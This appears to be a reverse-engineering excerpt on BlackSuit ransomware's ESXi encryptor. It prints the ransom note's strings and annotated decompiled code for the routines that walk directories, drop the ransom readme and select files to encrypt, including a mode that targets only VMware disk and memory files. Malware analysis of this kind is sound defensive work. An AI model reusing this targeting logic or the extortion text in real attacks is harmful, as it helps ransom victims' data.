////////////////////////////////////////////////////////////
// Blacksuit Encryptor
// https://www.shadowstackre.com/analysis/blacksuit-ransomware-esxi
//
// Technique: File and Directory Discover
// URL: https://attack.mitre.org/techniques/T1083/
//
// Analysis: ShadowStackRE
////////////////////////////////////////////////////////////

// Readme file
/*
 FILE = README.BlackSuit.txt

.rodata:0000000000584B10 aGoodWhateverTi db 'Good whatever time of day it is!',0Dh,0Ah
.rodata:0000000000584B32                 db 0Dh,0Ah
.rodata:0000000000584B34                 db 'Your safety service did a really poor job of protecting your file'
.rodata:0000000000584B75                 db 's against our professionals.',0Dh,0Ah
.rodata:0000000000584B93                 db 'Extortioner named  BlackSuit has attacked your system.',0Dh,0Ah
.rodata:0000000000584BCB                 db 0Dh,0Ah
.rodata:0000000000584BCD                 db 'As a result all your essential files were encrypted and saved at '
.rodata:0000000000584C0E                 db 'a secure server for further use and publishing on the Web into th'
.rodata:0000000000584C4F                 db 'e public realm.',0Dh,0Ah
.rodata:0000000000584C60                 db 'Now we have all your files like: financial reports, intellectual '
.rodata:0000000000584CA1                 db 'property, accounting, law actionsand complaints, personal files a'
.rodata:0000000000584CE2                 db 'nd so on and so forth. ',0Dh,0Ah
.rodata:0000000000584CFB                 db 0Dh,0Ah
.rodata:0000000000584CFD                 db 'We are able to solve this problem in one touch.',0Dh,0Ah
.rodata:0000000000584D2E                 db 'We (BlackSuit) are ready to give you an opportunity to get all th'
.rodata:0000000000584D6F                 db 'e things back if you agree to makea deal with us.',0Dh,0Ah
.rodata:0000000000584DA2                 db 'You have a chance to get rid of all possible financial, legal, in'
.rodata:0000000000584DE3                 db 'surance and many others risks and problems for a quite small comp'
.rodata:0000000000584E24                 db 'ensation.',0Dh,0Ah
.rodata:0000000000584E2F                 db 'You can have a safety review of your systems.',0Dh,0Ah
.rodata:0000000000584E5E                 db 'All your files will be decrypted, your data will be reset, your s'
.rodata:0000000000584E9F                 db 'ystems will stay in safe.',0Dh,0Ah
.rodata:0000000000584EBA                 db 'Contact us through TOR browser using the link:',0Dh,0Ah
.rodata:0000000000584EEA                 db 9,'http://<redacted>>'
.rodata:0000000000584F2A                 db '.onion/?id=
*/

// Search for files to encrypt
__int64 __fastcall search_files(const std::string *dirStr)
{
  __int64 listIterator; // rax
  char readmeFDStatus; // bl
  unsigned int errnoAddress; // ebx
  const char *readmeFilePath; // rax
  const char *dirStr2; // rax
  char *cStrFilePath; // rax
  char skipStatus; // bl
  struct stat statInfo; // [rsp+10h] [rbp-E0h] BYREF
  char dirStr3[16]; // [rsp+A0h] [rbp-50h] BYREF
  char dirPathStr[16]; // [rsp+B0h] [rbp-40h] BYREF
  char dirStr4[16]; // [rsp+C0h] [rbp-30h] BYREF
  DIR *dirp; // [rsp+D0h] [rbp-20h]
  struct dirent *dirEnt; // [rsp+D8h] [rbp-18h]

  std::list<std::string,std::allocator<std::string>>::push_back(&list_directories, dirStr);
  while ( std::list<std::string,std::allocator<std::string>>::size(&list_directories) )
  {
    // Start processing the list of directories
    listIterator = std::list<std::string,std::allocator<std::string>>::front(&list_directories);
    std::string::operator=(dirStr, listIterator);
    std::list<std::string,std::allocator<std::string>>::pop_front(&list_directories);
    std::string::operator+=(dirStr, "/");
    std::string::string((std::string *)dirPathStr, dirStr);
    // Write the readme file to the directory path
    readmeFDStatus = write_readme_file((__int64)dirPathStr) ^ 1;
    std::string::~string(dirPathStr);
    if ( readmeFDStatus )
    {
      errnoAddress = *__errno_location();
      readmeFilePath = (const char *)std::string::c_str(dirStr);
      logs::print((logs *)"Drop readme failed: %s(%d)", readmeFilePath, errnoAddress);
    }
    dirStr2 = (const char *)std::string::c_str(dirStr);
    dirp = opendir(dirStr2);                    // Open the directory at dirStr(2)
    if ( !dirp )
      return 0LL;
    while ( 1 )
    {
      dirEnt = readdir(dirp);
      if ( !dirEnt )
        break;
      // check if file is current or parent directory symlink file
      if ( strcmp(dirEnt->d_name, ".") && strcmp(dirEnt->d_name, "..") )
      {
        std::string::string((std::string *)dirStr3, dirStr);
        std::string::operator+=(dirStr3, dirEnt->d_name);// Add the directory location and filename into one string
        cStrFilePath = (char *)std::string::c_str((std::string *)dirStr3);
        if ( !(unsigned int)lstat(cStrFilePath, &statInfo) )
        {
          if ( (statInfo.st_mode & 0xF000) == 0x4000 )// File is a directory
          {
            std::list<std::string,std::allocator<std::string>>::push_back(&list_directories, dirStr3);
          }
          else if ( (statInfo.st_mode & 0xF000) == 0x8000 )// File is a regular file
          {
            std::string::string((std::string *)dirStr4, (const std::string *)dirStr3);
            skipStatus = SkipFiles((std::string *)dirStr4);// Check if need to skip the file
            std::string::~string(dirStr4);
            if ( !skipStatus )
            {
              while ( 1 )
              {
                pthread_mutex_lock(&mutex);
                if ( (unsigned __int64)std::list<std::string,std::allocator<std::string>>::size(&queue) <= 49999 )
                  break;
                pthread_mutex_unlock(&mutex);
                sleep(1u);
              }
              pthread_mutex_unlock(&mutex);
              pthread_mutex_lock(&mutex);
              std::list<std::string,std::allocator<std::string>>::push_back(&queue, dirStr3);
              pthread_cond_signal(&condvar);
              pthread_mutex_unlock(&mutex);
            }
          }
        }
        std::string::~string(dirStr3);
      }
    }
    closedir(dirp);
  }
  end_search();
  return 1LL;
}


// Determine which files to skip
__int64 __fastcall SkipFiles(std::string *fileName)
{
  const char *v3; // rax

  // Static files to always skip
  if ( std::string::find(fileName, ".blacksuit", 0LL) != -1LL
    || std::string::find(fileName, ".blacksuit", 0LL) != -1LL
    || std::string::find(fileName, ".BlackSuit", 0LL) != -1LL
    || std::string::find(fileName, ".blacksuit_log_", 0LL) != -1LL
    || std::string::find(fileName, ".list_", 0LL) != -1LL
    || std::string::find(fileName, ".PID_", 0LL) != -1LL
    || std::string::find(fileName, ".PS_list", 0LL) != -1LL
    || std::string::find(fileName, ".PID_list_", 0LL) != -1LL
    || std::string::find(fileName, ".CID_list_", 0LL) != -1LL
    || std::string::find(fileName, ".sf", 0LL) != -1LL
    || std::string::find(fileName, ".v00", 0LL) != -1LL
    || std::string::find(fileName, ".b00", 0LL) != -1LL
    || std::string::find(fileName, "README.BlackSuit.txt", 0LL) != -1LL
    || std::string::find(fileName, "README.blacksuit.txt", 0LL) != -1LL )
  {
    return 1LL;
  }
  if ( lstVmSkipID )
  {
    v3 = (const char *)std::string::c_str(fileName);
    if ( (unsigned __int8)is_on_the_list(lstVmSkipID, v3) )
      return 1LL;
  }

  // VMOnly enabled in the program arguments options, filter for these files
  if ( vmonly )
  {
    if ( std::string::find(fileName, ".vmem", 0LL) == -1LL
      && std::string::find(fileName, ".vmdk", 0LL) == -1LL
      && std::string::find(fileName, ".nvram", 0LL) == -1LL
      && std::string::find(fileName, ".vmsd", 0LL) == -1LL
      && std::string::find(fileName, ".vmsn", 0LL) == -1LL
      && std::string::find(fileName, ".vmss", 0LL) == -1LL
      && std::string::find(fileName, ".vmtm", 0LL) == -1LL
      && std::string::find(fileName, ".vmxf", 0LL) == -1LL
      && std::string::find(fileName, ".vmx", 0LL) == -1LL )
    {
      return 1LL;
    }
  }
  return 0LL;
}